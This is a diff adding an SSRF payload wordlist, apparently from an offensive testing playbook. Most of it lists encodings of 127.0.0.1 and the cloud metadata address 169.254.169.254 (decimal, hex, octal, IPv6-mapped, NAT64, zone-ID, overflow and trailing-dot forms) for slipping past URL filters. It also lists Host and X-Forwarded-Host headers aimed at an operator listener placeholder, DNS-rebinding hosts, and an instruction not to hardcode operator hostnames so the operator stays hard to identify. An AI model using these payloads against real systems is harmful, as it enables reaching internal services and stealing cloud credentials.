@@ -1,0 +1,108 @@
+# ssrf-address-forms.txt — alternate representations of the two addresses that matter
+#
+# Used by: ssrf-parser-confusion-rebind, webhook-ssrf-deblind, ssrf-fetch-by-url.
+# The point of this list is NOT that any one form is magic. It is that a filter written as a
+# string comparison, a regex, or a hand-rolled "is this private?" check has to normalize every
+# one of these identically to the resolver the HTTP client uses. They almost never do.
+#
+# Rule of thumb: if the filter rejects the literal and accepts ONE of these, the filter is a
+# string check and the whole lane is open. If it rejects all of them, it is resolving first and
+# checking the resolved IP; go to the redirect and rebinding sections of the playbook instead.
+#
+# Placeholders: replace OOB_HOST with the operator listener hostname and REBIND_HOST with a
+# rebinding domain you control. Never hardcode an operator hostname into a tracked file
+# (see feedback-payload-hostnames-correlate-operator-identity).
+
+## ---- loopback: 127.0.0.1 ----
+http://127.0.0.1/
+http://localhost/
+http://127.1/
+http://127.0.1/
+http://2130706433/
+http://0x7f000001/
+http://0x7f.0x0.0x0.0x1/
+http://017700000001/
+http://0177.0.0.1/
+http://0177.0000.0000.0001/
+http://0/
+http://0.0.0.0/
+http://[::1]/
+http://[::]/
+http://[0000::1]/
+http://[::ffff:127.0.0.1]/
+http://[::ffff:7f00:1]/
+http://[0:0:0:0:0:ffff:7f00:0001]/
+http://[64:ff9b::7f00:1]/
+http://127.0.0.1.nip.io/
+http://localtest.me/
+http://127.0.0.1.sslip.io/
+
+## ---- link-local metadata: 169.254.169.254 ----
+http://169.254.169.254/
+http://instance-data/
+http://metadata/
+http://2852039166/
+http://0xA9FEA9FE/
+http://0xA9.0xFE.0xA9.0xFE/
+http://0251.0376.0251.0376/
+http://0251.00376.000251.0000376/
+http://0251.254.169.254/
+http://[::ffff:a9fe:a9fe]/
+http://[0:0:0:0:0:ffff:a9fe:a9fe]/
+http://[0:0:0:0:0:ffff:169.254.169.254]/
+http://[fd00:ec2::254]/
+http://[64:ff9b::a9fe:a9fe]/
+http://169.254.169.254.nip.io/
+# overflow forms — several parsers wrap these back to the target address
+http://425.510.425.510/
+http://7147006462/
+http://0x41414141A9FEA9FE/
+
+## ---- trailing dot (fully-qualified form) ----
+# Defeats deny lists that compare the hostname string without normalizing the root label.
+http://metadata.google.internal./
+http://OOB_HOST./
+
+## ---- other private space worth sweeping once reach is proven ----
+http://10.0.0.1/
+http://172.16.0.1/
+http://192.168.0.1/
+http://100.64.0.1/
+http://[fd00::1]/
+http://[fe80::1]/
+
+## ---- IPv6 zone identifiers ----
+# The %-separated zone id is part of the address grammar. Filters that parse the bracketed
+# host with a plain IPv6 regex reject the address without the zone and accept it with one.
+# Send the % both raw and percent-encoded (%25) -- some stacks decode before parsing.
+http://[fe80::1%25eth0]/
+http://[fe80::1%eth0]/
+http://[::1%25lo]/
+http://[fe80::1%251]/
+
+## ---- NAT64 well-known prefixes ----
+# 64:ff9b::/96 is the standard prefix; 64:ff9b:1::/48 is local-use and is the one hand-rolled
+# filters and several off-the-shelf SSRF-filter libraries have historically failed to block.
+http://[64:ff9b::a9fe:a9fe]/
+http://[64:ff9b:1::a9fe:a9fe]/
+http://[64:ff9b::7f00:1]/
+http://[64:ff9b:1::7f00:1]/
+
+## ---- request headers a server may trust and then dial ----
+# Not URL forms, but the same class with no URL parameter involved: a framework that rebuilds
+# its own absolute base URL from the inbound request will fetch the host you supply here.
+# See playbook ssrf-host-header-framework. One header at a time so the effective one is known.
+# Host: OOB_HOST
+# X-Forwarded-Host: OOB_HOST
+# X-Original-Host: OOB_HOST
+# X-Host: OOB_HOST
+# X-Forwarded-Server: OOB_HOST
+# Forwarded: host=OOB_HOST
+# (also: a duplicated Host header, and an absolute-URI request line whose host disagrees
+#  with the Host header)
+
+## ---- names that resolve inward ----
+# A perfectly ordinary public hostname whose A record points at private space. Nothing about the
+# URL looks wrong; only a post-resolution check catches it.
+# Stand one up on a domain you control, or use a wildcard resolver service.
+http://REBIND_HOST/
